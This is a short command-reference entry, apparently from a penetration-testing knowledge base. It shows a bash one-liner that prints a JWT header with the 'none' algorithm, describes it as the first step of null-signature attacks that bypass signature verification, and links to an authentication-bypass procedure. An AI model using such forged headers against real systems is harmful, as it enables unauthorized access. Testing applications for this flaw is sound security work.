---
type: command
executor: bash
data: 'echo ''{"alg":"none","typ":"JWT"}'''
output: null
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - jwt
  - token-craft
verified: true
validated: true
---

# output-jwt-null-header-json

## Command

```bash
echo '{"alg":"none","typ":"JWT"}'
```

## Description

Outputs the JSON structure for a JWT header specifying the 'none' algorithm, which is used in null signature attacks to bypass signature verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; fixed output for standard null header | No |

## Examples

### Basic Usage

```bash
echo '{"alg":"none","typ":"JWT"}'
```

### Advanced Usage

Pipe to a file for later use:

```bash
echo '{"alg":"none","typ":"JWT"}' > header.json
```

## Expected Output

{"alg":"none","typ":"JWT"}

## Related

- [[procedures/jwt-null-signature-authentication-bypass]]
- [[commands/output-jwt-payload-json]]
